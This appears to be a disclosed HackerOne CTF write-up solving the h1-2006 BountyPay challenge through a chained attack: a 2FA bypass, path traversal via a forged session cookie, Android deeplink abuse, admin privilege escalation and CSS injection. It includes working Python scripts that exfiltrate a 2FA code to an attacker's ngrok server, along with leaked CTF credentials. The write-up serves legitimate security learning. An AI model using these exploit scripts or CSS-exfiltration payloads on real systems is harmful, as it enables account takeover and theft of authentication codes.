---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/privilege-escalation
  - env/web
substate: "resolved"
weakness: "Privilege Escalation"
enriched: true
date: 2020-06-18
submitted: 2020-06-04T16:41:49.316Z
bounty_usd: null
votes: 3
cve: []
program: "[[programs/h1-ctf|h1-ctf]]"
reporter: "thehackerish"
source: "https://hackerone.com/reports/891093"
title: "[H1-2006 2020] Solution for the h1-2006 CTF challenge"
---
# [H1-2006 2020] Solution for the h1-2006 CTF challenge

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 3 | **Program:** h1-ctf | **Disclosed:** 2020-06-18

- Report: [https://hackerone.com/reports/891093](https://hackerone.com/reports/891093)
- CWE: Privilege Escalation
- Submitted: 2020-06-04T16:41:49.316Z

## Timeline

- **Report Filed**
- **2020-06-04** @thehackerish: ##TL;DR
The flag is `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`. This is my first Hackerone CTF and all I can say is that I’m hooked! Thanks for the awesome challenge!

##Introduction
In an attempt to participate in a live hacking event and hack with the elite, I accepted the challenge of solving this CTF. During the process, I had the chance to exploit vulnerabilities I had only read about. Besides, I enjoyed writing custom scripts to automate some tasks. Finally, I learned how to use some advanced features of the tools I commonly use.
This write-up is divided into several sections, each one representing a milestone in the CTF journey. Each section is further divided into smaller parts to easily describe the vulnerabilities and the process of exploitation.

##Subdomain enumeration
The first step is checking the scope. This is crucial to avoid testing out-of-scope assets. In the [policy page](https://hackerone.com/h1-ctf), the wildcard domain `*.bountypay.h1ctf.com` is in scope.
Running `assetfinder` and `httprobe` on the target reveals the following web applications:

```
assetfinder --subs-only bountypay.h1ctf.com | sort -u | httprobe

http://app.bountypay.h1ctf.com
http://bountypay.h1ctf.com
http://api.bountypay.h1ctf.com
http://software.bountypay.h1ctf.com
http://staff.bountypay.h1ctf.com
http://www.bountypay.h1ctf.com
https://staff.bountypay.h1ctf.com
https://www.bountypay.h1ctf.com
https://app.bountypay.h1ctf.com
https://software.bountypay.h1ctf.com
https://bountypay.h1ctf.com
https://api.bountypay.h1ctf.com
```

##Directory bruteforcing
For each web application, I performed a light directory bruteforce to spot any low hanging directories using `ffuf` and the `quickhits.txt` wordlist from the [SecLists](https://github.com/danielmiessler/SecLists) project.

```
ffuf -u HOSTDIR -w quickhits.txt:DIR -w hosts:HOST -mc 200
```
Several interesting folders were found as shown below.
{F855508}

All subdomains are directly accessible, except for the `software` subdomain which returns a HTTP 401 status code, which indicates that it might be restricted to internal access only. This will be useful later.

##Obtaining the foothold
The `/.git/config` file from the screenshot above seems interesting as it usually holds details about the code repository. Fetching it using `curl` reveals the following highlighted GitHub remote origin.
{F855506}

The `request-logger` repository contains a PHP file which logs HTTP requests into a log file named `bp_web_trace.log`. Indeed, fetching that file reveals some base64 encoded requests. The following one-liner grabs the file and decodes them.

```
curl https://app.bountypay.h1ctf.com/bp_web_trace.log | cut -d":" -f2 | xargs -n1 -I{} sh -c "echo {} | base64 -d" | js-beautify
```
As shown in the screenshot below, the logs disclose plaintext login credentials of the user `brian.oliver`, a certain `challenge_answer` value and a request to the `/statements` endpoint. For now, we are interested in the credentials.
{F855507}


##2FA bypass
Using the previously gathered credentials, I login to `https://app.bountypay.h1ctf.com`. However, there is a 2FA feature preventing me from signing in.

Looking at the POST request which is used to send the 2FA code, I noticed a POST parameter named `challenge_answer`, which I previously gathered from the logs. However, it was tied to another POST parameter named `challenge`, which seems to be an MD5 hash.

Luckily, the `challenge` parameter was simply the MD5 hash of the `challenge_answer`. Therefore, it is possible to completely bypass the 2FA feature by generating the MD5 hash of the string `bD83Jk27dQ` and sending it in the 2FA request as shown below.
{F855509}

As you can see, a new session named `token` has been issued in the `Set-Cookie` HTTP response Header, allowing access to Oliver’s BountyPay customer dashboard.

##Accessing internal files
Can Oliver pay May’s bounties? Unfortunately not! However, loading the transactions triggers a request to the API, which is one of the assets found during the subdomain enumeration process. The following screenshot shows a call to the `/api/accounts` endpoint with Oliver’s account. Notice the account ID `F8gHiqSdpK`  is appended to the API call, this will be useful shortly.
{F855510}

###Abusing weak session management
The following command decodes Oliver’s session and shows the result.

```
echo eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9 | base64 -d

{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}
```

As you can see, the session cookie is a base-encoded JSON containing Oliver’s account ID and a hash. Since the account ID is used as part of the endpoint to the API, what if the backend trusted this input?
To validate this hypothesis, the following token was constructed to call the `/statements` API endpoint. 

```
{"account_id":"F8gHiqSdpK/statements?month=05&year=2020","hash":"de235bffd23df6995ad4e0930baac1a2"}
```

It sends the same request as before, with the main difference that we control part of the API. The question mark after `statements` is used to truncate the API path. If we get a valid response from the API, it is a strong indication that it trusts the account ID attribute inside the session cookie. The following screenshot confirms the hypothesis.
{F855512}

###Exploiting a path traversal vulnerability and abusing the trust relationships
Now that we control part of the API, we can attempt pivoting inside the BountyPay infrastructure through the app subdomain. 
From the subdomain enumeration step, it was found that the API had a redirect endpoint. Fetching it using `curl` returns the message `url parameter not set`. Through descriptive error messages, the API gives enough hints on how we should talk to it. Besides, the API allows redirection to some internal subdomains, including the `software.bountypay.h1ctf.com` asset

In the **Directory bruteforcing** section above, I mentioned how the `software` subdomain was restricted. What if we could access it using this redirection? 
Using the following token value, we can perform path traversal and call the API’s `/redirect` endpoint through the BountyPay customer application. The following session cookie is used.

```
{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/blah","hash":"de235bffd23df6995ad4e0930baac1a2"}
```

This time, the response status code is `404`, not `401` anymore. 

To automate the exploitation process, the following script was written to perform a light bruteforce using the [raft-small-directories-lowercase.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-small-directories-lowercase.txt) wordlist.

```
from base64 import b64encode
import requests
from sys import argv

url = "https://app.bountypay.h1ctf.com/statements?year=2020&month=04"
cookies = {}

def exploit(i):
    token = '{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/%s&x=","hash":"de235bffd23df6995ad4e0930baac1a2"}' % i
    token = b64encode(token)
    cookies["token"] = token
    r = requests.get(url, cookies = cookies)
    if "404 Not Found" not in r.text:
        print i

f=open(argv[1],'r')
wordlist = f.read().splitlines()
f.close()

for i in wordlist:
    exploit(i)
```

Running the script with `python api.py raft-small-directories-lowercase.txt` reveals the existence of a folder named `uploads`, which contains the `BountyPay.apk` file. The following request with BurpSuite confirms what the script has just found.
{F855511}


##Exploiting the Android Application
Luckily, the APK file is directly accessible from outside, which makes it easy to download directly from the `software` subdomain. From there, I run `d2j-dex2jar` to generate a JAR file from the APK. Then, I use `JD-GUI` to load the JAR file and inspect the source code. Furthermore, I run `apktool` to decompile the application’s archive.
The first screen of the application asked for a username and an optional twitter handle. Upon clicking on `Submit`, the `PartOneActivity` activity appeared.

###PartOneActivity
An empty page appears with a button. When clicked, it shows hints regarding deeplinks and parameters.
Inside the decompiled folder generated earlier using `apktool`, the `AndroidManifest.xml` file reveals that this activity has an intent filter, which means that it is directly reachable. Besides, the data URI is expected to be of the form `one://part`.
{F855514}

Furthermore, looking at the source code using the previously mentioned `JD-GUI` shows that the activity accepts one parameter named `start`. When it holds the value `PartTwoActivity`, the application sends an intent to the `PartTwoActivity` activity. This is a screenshot of the code responsible for this behavior.
{F855513}

Using the Activity Manager (am for short), I can send the expected deeplink to land on the  `PartTwoActivity` activity. First, I extract the BountyPay app’s package name using `adb shell pm list packages -f bounty`. Then, the following command makes the application jump to the `PartTwoActivity` activity.

```
adb shell am start -n bounty.pay/bounty.pay.PartOneActivity -d "one://part?start=PartTwoActivity"
```

###PartTwoActivity
Same as the previous one, this activity is blank, at least at first. Inspecting the Android Manifest file once again confirms that it also accepts an intent, this time with a scheme set to the value `two`.
The code expects two parameters, `two` and `switch`. When they hold the values `light` and `on` respectively, I can show some hidden UI components. The following screenshot highlights this part.
{F855516}

Again, using the Activity Manager, we send an intent to this activity.

```
adb shell am start -n bounty.pay/bounty.pay.PartTwoActivity -d "two://part?two=light\&switch=on"
```
A hash value and a user input get revealed.
{F855515}


Cracking the hash on [crackstation](https://crackstation.net/) gives the value `Token`. Besides, inspecting the source code shows that the activity expects the input to start with the prefix `X-`. The second part comes from the `param1DataSnapshot` variable. The following code is responsible for such behavior.
{F855518}

At first, I had no idea where to get the value of the `param1DataSnapshot` variable. Therefore, I patched the `user_created.xml` file in the `shared_prefs` folder to include the line `<string name="PARTTWO">COMPLETE</string>`. Then, I directly accessed the third activity. However, revisiting the challenge and taking the hash value as a hint, I simply entered the value `X-Token` in the text box, which effectively allowed me to access `PartThreeActivity`.

###PartThreeActivity
Inspecting the Android manifest for this activity reveals that it expects a scheme with the value `three`. Besides, reading through the Java code shows that it is expecting three parameters; `three`, `switch` and `header`. When they hold the values `base64(“PartThreeActivity”)`, `base64(“on”)` and `X-Token` respectively, the activity will show some hidden components. This is the code responsible for that.
{F855517}

The following command provides the activity with the right deeplink to show the hidden components.

```
adb shell am start -n bounty.pay/bounty.pay.PartThreeActivity -d "three://part?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token"
```

{F855519}

###CongratsActivity
When inspecting what changed in the `/data/data/bounty.py/shared_prefs/user_created.xml` file, I can see a new element containing a hash with the value `8e9998ee3137ca9ade8f372739f062c1`. When I use it in the now-visible input, I land on the `CongratsActivity` activity, with a button containing a hint that the new revealed hash will be useful in the next steps.
{F855521}

##Expanding access using the new hash
Based on the `performPostCall` function from the source code of the `PartThreeActivity` activity, I notice that the API accepts a POST request and a `X-Token` header containing the value I have just leaked from the `user_created.xml` file.
{F855520}

###API enumeration
I conduct a light bruteforce, this time using the `X-Token` header and the POST request. The following command reveals the endpoint `/api/staff` which returns a `400` status code with the error `Missing Parameter`.

```
ffuf -w raft-small-directories-lowercase.txt -u https://api.bountypay.h1ctf.com/api/FUZZ -X POST -mc all -fc 404 -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1"
```

Because this is a REST API as mentioned in the API’s home page, I attempt to change the method from POST to GET, which reveals two staff members along with their `name` and `staff_id` attributes.
{F855522}

Using the POST request with those attributes shows the error `Staff Member already has an account`. However, sending a dummy `staff_id` value returns the error `Invalid Staff ID`. This means two things:
* I have found the right parameters
* I need a staff user who is not registered yet

###OSINT and staff access
BountyPay owns the Twitter account @BountypayHQ, which follows the user @SandraA76708114 who has just started working on BountyPay. Maybe she hasn't been registered in the staff application yet? 
On her [tweet](https://twitter.com/SandraA76708114/status/1258693001964068864/photo/1), she posts her `staff_id`, which is what we need. As a result, the following screenshot shows her plaintext credentials `sandra.allison / s%3D8qB8zEpMnc*xsz7Yp5` for the staff application.
{F855524}


##Privilege escalation
Sadly, Sandra can’t perform privileged actions. The set of features is limited to displaying one ticket, reporting pages to the admin and updating her profile name her avatar.

###Javascript code analysis
In the `/js/website.js` JavaScript file, the endpoint `/admin/upgrade?username=` seems promising. However, Sandra doesn’t have the right to execute it. Besides, the Javascript code shows tabs in the UI based on their respective HTML class. When the hash location contains one of the classes, a click gets triggered. 

###The update profile feature
Testing the update feature reveals that the avatar value gets inserted into a HTML class. For example, setting the avatar value to `upgradeToAdmin myclass`, Sandra’s avatar would contain the classes `upgradeToAdmin` and `myclass` as shown below.
{F855523}

###The login page
Testing the login page reveals that it accepts the parameter `username`, which gets inserted into an input field named `username`. The path should look like `/?template=login&username=USERNAME-HERE`. This will be useful when I combine everything together. 

###Loading multiple templates
During the testing of the template GET parameter, it was possible to include multiple templates using an array. For example, the path `/?template[]=login&template[]=home` would load both the `login` and the `home` templates in one page as shown below.
{F855525}

###Combining the observed behaviours
What if we can cause the admin to trigger the upgrade feature using the observed behaviours? To achieve that, we can inject the `upgradeToAdmin` and the `tab4` classes into Sandra’s avatar. To reflect the injected classes into the admin’s page, I can load the `ticket` template with the `ticket_id` parameter. Besides, I can load the login page with the `username` parameter set to `sandra.allison` to populate the username parameter with Sandra’s username when the click triggers. To trigger the click, I can append the `tab4` hash to the path. Finally, I can report the rendered page to the admin so that the upgrade request triggers on his/her end. The following single request can achieve the desired outcome.

```
`/?template[]=login&template[]=ticket&ticket_id=3582&username=sandra.allison&template[]=admin#tab4`
```

To report this page, we can base64 encode the malicious path above and send it to receive a new admin session cookie.
{F855527}

I notice that a new `Admin` tab appears, which contains the credentials of Marten Mickos `marten.mickos / h&H5wy2Lggj*kKn4OD&Ype`.
{F855526}


##2FA bypass
The 2FA kicks in once again when I login as Marten. However, using Oliver’s `challenge` and `challenge_answer` from the first 2FA bypass works for Marten as well. A new session cookie is provided which allows access to the customer app as Marten. Therefore, I can finally see May’s bounty transaction.
{F855530}

##2FA payment bypass using CSS injection
Unfortunately, the payment requires yet another layer of protection using 2FA. Part of this feature involves a POST request containing a parameter named `app_style`, which points to an attacker-controlled CSS file. 

###Detecting the CSS injection vulnerability
Pointing this parameter to a server that I control reveals from the `User-Agent` corresponds to the `Chromium headless browser` as shown in the screenshot below.
{F855528}


Because the CSS style doesn’t affect the resulting page, one hypothesis would be that the Chromium browser loads a HTML page and applies my malicious CSS style.
 
To validate this hypothesis, I host the following CSS file on my server. If the `body` element exists, which is most luckily the case, I will receive a callback on my server to `/body`. I use [ngrok](https://ngrok.com/) to handle the incoming requests.


```
body{
    background: url("https://647832432.ngrok.io/body");
}
```

Sure enough, I successfully get the callback as shown in the following screenshot.
{F855529}


###Discovering the HTML content
I wrote the script below to assist me at guessing virtually any part of the target HTML page. It takes a string value and an attribute name as input, generates the malicious CSS file and sends it to the server. For example, running `python css.py c class` would trigger a callback for every element which has `cX` as part of its class. `X` is configured to be a character from the `charset` variable.
The line `temp = code+i` can be changed to `temp = i+code` to search backwards.

```
import string
import requests
from sys import argv

ngrok = "https://8677932a733b.ngrok.io/"
url = "https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba"
cookies = {"token":"eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9"}
css_url = ngrok+"/me.css"
data = {"app_style":css_url}
charset = string.ascii_lowercase+string.ascii_uppercase+string.digits+"+/=-_&@*$ "

def gen_css(code,attrib):
    out = ''
    payload = '''
    *[%s*="%s"]{
        background: url(%s%s);
    }'''
    for i in charset:
        temp = code+i
        out += payload % (attrib,temp,ngrok,temp)
        out += '\n'

    f=open('me.css','w')
    f.write(out)
    f.close()

code = argv[1]
attrib = argv[2]
gen_css(code,attrib)
r = requests.post(url, data=data, cookies=cookies)
```

Systematically probing the HTML using the script above, I find that there is a `div` with a class named `challenge-area` and seven input elements with the name `code_1` through `code_7`

Moreover, it seems that these codes are included inside the `div` with the class `challenge-area` because the following css gives a callback.

```
div[class^=challenge-area] input[name=code_1]:nth-child(1){
  background: url("https://14644d56763a.ngrok.io/1");
}
```

Furthermore, tweaking the `payload` variable from the script above to match the exact occurrence of a needle reveals that each `code_x` element contains only one character, which suggests that the code might be 7 characters long. That explains why the UI has a `maxlength` attribute set to 7 for the 2FA input field.

###The final exploitation
Once agains, I wrote the following dirty script to perform an end-to-end exploitation. It performs the following:
1. Builds a CSS file which contains all the possible CSS selections targeting the code input fields.
1. Sends the CSS file and grabs the `challenge` and the `challenge_timeout` values from the HTML response.
1. Extracts the 7 characters and builds a full string out of it. 
1. Sends the exfiltrated `challenge_answer` along with the `challenge` and the `challenge_timeout` values to the server.

**Step 4 is configured to run through my Burp instance to see what happens.**

```
import string
import requests
from sys import argv
import os
from time import sleep
from base64 import b64decode
import re

proxies = {"http":"http://localhost:8080","https":"https://localhost:8080"}
ngrok = "https://6b5e287e0024.ngrok.io/"
url = "https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba"
cookies = {"token":"eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9"}
css_url = ngrok+"/me.css"
data = {"app_style":css_url}
printable = string.ascii_lowercase+string.ascii_uppercase+string.digits+"+/=-_&@*$ "
regex_challenge = 'name="challenge" value="([a-zA-Z0-9]{32})"'
regex_timeout = 'name="challenge_timeout" value="([0-9]+)"'

def gen_values():
    out = []
    for i in printable:
        out.append(i)
    return out
    
def gen_css():
    out2 = ''
    payload = '''
    div[class*=challenge] input[name=code_%d][value="%s"]:nth-child(%d){
        background: url(%s%s);
    }'''
    out = gen_values()
    for position in range(100):
        for elem in out:
            out2 += payload %(position,elem,position,ngrok+str(position)+"/",elem)
            out2 += '\n'

    f=open('me.css','w')
    f.write(out2)
    f.close()

def run():
    #delete ngrok logs to start fresh
    delete_requests = 'curl "http://127.0.0.1:4040/api/requests/http" -XDELETE -H "Content-Type: application/json"'
    os.system(delete_requests)

    #generating the css file
    gen_css()

    #send the malicious css file
    r = requests.post(url, data=data, verify=False, cookies=cookies)
    challenge = re.search(regex_challenge, r.text).group(1)
    timeout = re.search(regex_timeout, r.text).group(1)

    #wait a bit for the callbacks to arrive
    sleep(1)

    #dirty command to parse ngrok callbacks and save results to a file
    command = 'curl "http://127.0.0.1:4040/api/requests/http?limit=50" -H "Content-Type: application/json" | gron | grep "request.uri" | grep -v "me.css" | cut -d"\\"" -f2 > parsed'
    os.system(command)
    f=open('parsed','r')
    lines = f.read().splitlines()
    f.close()

    #constructing the 2FA code
    lines.sort()
    code = ''.join(c.split('/')[-1] for c in lines)

    #sending the 2FA code to confirm the payment
    challenge_data={"challenge_timeout":timeout, "challenge":challenge, "challenge_answer":code}
    r = requests.post(url, data=challenge_data, verify=False, cookies=cookies, proxies=proxies)

run()
```

Lo and behold, I finally get the satisfying HTML response with the flag!

##Conclusion
This write-up describes a smooth path. However, the reality was totally different. The write-up doesn’t include rabbit holes I fell for when I was looking for ways to pivot inside the infrastructure. It doesn’t mention the long hours trying to figure out how to solve the Android challenges, and it certainly doesn’t talk about the sleepless nights trying to escalate the privileges, code the scripts and debug everything! I also had the pleasure to work with a buddy, and I now understand why hackers during the live events discover such novel bugs!
- **Report Triaged**
- **Report Title Updated**
- **2020-06-11** @nahamsec: Hello,

I wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!

We will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we'll make sure to let you know when you can publish them on your site!

If you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!
- **2020-06-12** @thehackerish: No worries! Next time maybe :)
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **2020-06-18** @thehackerish: Blog post link: https://thehackerish.com/capture-the-flag-writeup-for-the-h1-2006-challenge/
